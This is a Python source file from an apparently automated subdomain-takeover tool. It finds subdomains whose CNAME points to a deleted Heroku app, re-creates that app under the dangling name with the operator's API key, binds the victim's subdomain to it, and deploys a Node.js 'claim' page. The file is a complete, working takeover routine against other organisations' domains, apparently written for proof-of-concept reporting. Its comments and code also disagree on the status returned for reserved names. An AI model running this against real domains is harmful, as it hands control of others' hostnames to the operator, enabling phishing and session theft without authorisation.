"""
app/takeover/providers/heroku.py

Heroku subdomain takeover.

Vulnerable pattern
------------------
  subdomain CNAME → <app-name>.herokuapp.com
  The <app-name> no longer exists in Heroku → we can create it.

Auto-takeover
-------------
  1. PRE-FLIGHT: Check if the app name is available via GET /apps/<name>.
     - 404 → name is free → proceed to create
     - 200 → app exists in another account → NOT_VULN (suppress, → ALIVE)
     - 403 → name is reserved/restricted by Heroku → POTENTIAL_LONG
             (Heroku holds reserved names for a period after deletion;
              the name may become free later. Recheck via POTENTIAL_LONG cycle.)
     - Other error → treat as FAIL (network/auth issue)
  2. Create a new Heroku app with the exact dangling app-name
  3. Add the subdomain as a custom domain on that app
  4. Deploy a slug with the claim HTML via Heroku Build API

  The pre-flight avoids a wasteful create attempt when the name is reserved
  or taken, and correctly routes reserved names to POTENTIAL_LONG instead of
  falsely marking them as permanently NOT_VULN.

Required .env
-------------
  HEROKU_API_KEY  — Heroku API key (Account → API Key in dashboard)
"""

import asyncio
import base64
import json
import re
import tarfile
import io
from typing import Optional, Tuple

import aiohttp

from app.core.config import settings
from app.core.logging import logger
from app.takeover.subdomain_hunter.providers.base import CLAIM_HTML, TakeoverResult, TakeoverStatus

_API     = "https://api.heroku.com"
_TIMEOUT = aiohttp.ClientTimeout(total=30)

# Matches: <anything>.herokuapp.com
_HEROKU_RE = re.compile(r"^([a-z0-9][a-z0-9\-]{1,28}[a-z0-9])\.herokuapp\.com\.?$", re.IGNORECASE)


def extract_app_name(cname: str) -> Optional[str]:
    cname = cname.lower().strip().rstrip(".")
    m = _HEROKU_RE.match(cname)
    return m.group(1) if m else None


class HerokuTakeoverChecker:

    PROVIDER = "heroku"

    def __init__(self) -> None:
        self._key: Optional[str] = getattr(settings, "HEROKU_API_KEY", None)
        if not self._key:
            logger.warning("HerokuTakeoverChecker: HEROKU_API_KEY not set — disabled")

    async def attempt(self, subdomain_name: str, cname: str) -> TakeoverResult:
        """Attempt to claim a dangling Heroku CNAME. Never raises."""
        app_name = extract_app_name(cname)
        if not app_name:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error=f"Cannot extract app name from CNAME: {cname}",
            )

        if not self._key:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                evidence={"heroku_app": app_name},
                error="HEROKU_API_KEY not configured",
            )

        logger.info("heroku takeover: attempting app=%s for %s", app_name, subdomain_name)

        headers = {
            "Authorization": f"Bearer {self._key}",
            "Content-Type":  "application/json",
            "Accept":        "application/vnd.heroku+json; version=3",
        }

        try:
            async with aiohttp.ClientSession(timeout=_TIMEOUT, headers=headers) as http:
                return await self._run(http, subdomain_name, app_name)
        except asyncio.TimeoutError:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error="Timeout",
            )
        except Exception as exc:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error=str(exc),
            )

    async def _run(
        self, http: aiohttp.ClientSession, subdomain: str, app_name: str
    ) -> TakeoverResult:
        evidence = {"heroku_app": app_name}

        # ── PRE-FLIGHT: check app name availability before attempting create ──
        # GET /apps/<name> tells us the current state of the name without side
        # effects.  This avoids burning a create attempt on a reserved name.
        #
        #   404 → name is free → proceed
        #   200 → app exists: ours (an earlier partial attempt) or another
        #         account's. Only the domain add distinguishes them: Heroku
        #         rejects it for apps we do not own.
        #   403 → name is reserved by Heroku (post-deletion hold) → POTENTIAL_LONG
        #         The name may become claimable after Heroku's hold expires.
        #   Other → fall through and let _create_app surface the real error.
        avail_status, avail_err = await self._check_app_available(http, app_name)

        app_is_ours = False

        if avail_status == "taken":
            domain_ok, domain_err = await self._add_domain(http, app_name, subdomain)
            if not domain_ok and not _domain_already_bound(domain_err):
                logger.info(
                    "heroku preflight: app=%s exists in another account — NOT_VULN for %s (%s)",
                    app_name, subdomain, domain_err,
                )
                return TakeoverResult(
                    status=TakeoverStatus.NOT_VULN,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    confidence_delta=-30,
                    evidence=evidence,
                    error="App name exists in another Heroku account — not claimable",
                )
            # Our own app from a partial attempt: resume at the deploy step.
            app_is_ours = True
            evidence["app_reused"] = True
            logger.info(
                "heroku preflight: app=%s already belongs to us — resuming %s",
                app_name, subdomain,
            )

        if avail_status == "reserved":
            logger.info(
                "heroku preflight: app=%s is reserved/restricted — POTENTIAL_LONG for %s",
                app_name, subdomain,
            )
            return TakeoverResult(
                status=TakeoverStatus.NEEDS_TXT,
                provider=self.PROVIDER,
                subdomain=subdomain,
                confidence_delta=0,
                evidence={**evidence, "reason": "heroku_name_reserved"},
                error=(
                    f"App name '{app_name}' is reserved by Heroku (post-deletion hold). "
                    "The name may become claimable once the hold expires. "
                    "Monitoring via POTENTIAL_LONG recheck cycle."
                ),
            )

        if not app_is_ours:
            # 1 — Create the app with the exact dangling name
            created, err = await self._create_app(http, app_name)
            if not created:
                if "is already taken" in (err or "") or "taken" in (err or "").lower():
                    return TakeoverResult(
                        status=TakeoverStatus.NOT_VULN,
                        provider=self.PROVIDER,
                        subdomain=subdomain,
                        confidence_delta=-30,
                        evidence=evidence,
                        error="App name already taken by another account",
                    )
                return TakeoverResult(
                    status=TakeoverStatus.FAIL,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    evidence=evidence,
                    error=f"Create app failed: {err}",
                )

            # 2 — Add custom domain
            domain_ok, err = await self._add_domain(http, app_name, subdomain)
            if not domain_ok:
                logger.warning("heroku: domain add failed for %s: %s", subdomain, err)
                # App was created — still noteworthy, report partial success
                return TakeoverResult(
                    status=TakeoverStatus.FAIL,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    evidence={**evidence, "app_created": True},
                    error=f"Domain add failed: {err}",
                )

        # 3 — Deploy claim page
        claim_url = await self._deploy(http, app_name, subdomain)

        logger.info("heroku takeover: SUCCESS app=%s subdomain=%s", app_name, subdomain)
        return TakeoverResult(
            status=TakeoverStatus.SUCCESS,
            provider=self.PROVIDER,
            subdomain=subdomain,
            confidence_delta=+10,
            evidence={
                **evidence,
                "app_created": not app_is_ours,
                "domain_added": True,
            },
            claim_url=claim_url or f"https://{app_name}.herokuapp.com",
        )

    # ── Helpers ───────────────────────────────────────────────────────────────

    async def _check_app_available(
        self, http: aiohttp.ClientSession, app_name: str
    ) -> Tuple[str, Optional[str]]:
        """
        GET /apps/<app_name> to determine name availability.

        Returns:
          ("free",     None)   — 404: name is unclaimed, safe to create
          ("taken",    None)   — 200: app exists in another account
          ("reserved", None)   — 403: Heroku is holding the name post-deletion
          ("unknown",  reason) — unexpected status, caller falls through
        """
        try:
            async with http.get(f"{_API}/apps/{app_name}") as resp:
                if resp.status == 404:
                    return "free", None
                if resp.status == 200:
                    return "taken", None
                if resp.status == 403:
                    return "reserved", None
                text = await resp.text()
                return "unknown", f"HTTP {resp.status}: {text[:200]}"
        except asyncio.TimeoutError:
            return "unknown", "timeout on preflight check"
        except Exception as exc:
            return "unknown", str(exc)

    async def _create_app(
        self, http: aiohttp.ClientSession, app_name: str
    ) -> Tuple[bool, Optional[str]]:
        async with http.post(f"{_API}/apps", json={"name": app_name}) as resp:
            if resp.status in (200, 201):
                return True, None
            text = await resp.text()
            return False, text[:300]

    async def _add_domain(
        self, http: aiohttp.ClientSession, app_name: str, domain: str
    ) -> Tuple[bool, Optional[str]]:
        async with http.post(
            f"{_API}/apps/{app_name}/domains",
            json={"hostname": domain},
        ) as resp:
            if resp.status in (200, 201):
                return True, None
            text = await resp.text()
            return False, text[:300]

    async def _deploy(
        self, http: aiohttp.ClientSession, app_name: str, subdomain: str
    ) -> Optional[str]:
        """
        Deploy claim page via Heroku Build API using a source tarball.
        Creates a minimal Node.js app that serves the claim HTML.
        """
        try:
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w:gz") as tar:
                # index.js — minimal HTTP server
                server_js = (
                    'const http = require("http");\n'
                    'const html = `' + CLAIM_HTML.replace("`", "\\`") + '`;\n'
                    'http.createServer((_, res) => {\n'
                    '  res.writeHead(200, {"Content-Type": "text/html"});\n'
                    '  res.end(html);\n'
                    '}).listen(process.env.PORT || 3000);\n'
                )
                _add_tar_file(tar, "index.js", server_js)

                # package.json
                pkg = json.dumps({
                    "name": app_name,
                    "version": "1.0.0",
                    "scripts": {"start": "node index.js"},
                    "engines": {"node": ">=16"},
                })
                _add_tar_file(tar, "package.json", pkg)

            source_blob = base64.b64encode(buf.getvalue()).decode()

            # Upload source blob
            async with http.post(
                f"{_API}/apps/{app_name}/sources",
                json={},
            ) as resp:
                if resp.status not in (200, 201):
                    return None
                sources = await resp.json()

            put_url = sources["source_blob"]["put_url"]
            get_url = sources["source_blob"]["get_url"]

            async with http.put(put_url, data=base64.b64decode(source_blob)) as resp:
                if resp.status not in (200, 201):
                    return None

            # Trigger build
            async with http.post(
                f"{_API}/apps/{app_name}/builds",
                json={"source_blob": {"url": get_url, "version": "poc"}},
            ) as resp:
                if resp.status not in (200, 201):
                    return None

            return f"https://{subdomain}"

        except Exception as exc:
            logger.warning("heroku deploy failed for %s: %s", subdomain, exc)
            return None


def _domain_already_bound(error: Optional[str]) -> bool:
    """True when the app owns the hostname already (a resumed partial claim)."""
    text = (error or "").lower()
    return "already" in text and ("exist" in text or "taken" in text or "bound" in text)


def _add_tar_file(tar: tarfile.TarFile, name: str, content: str) -> None:
    data = content.encode()
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))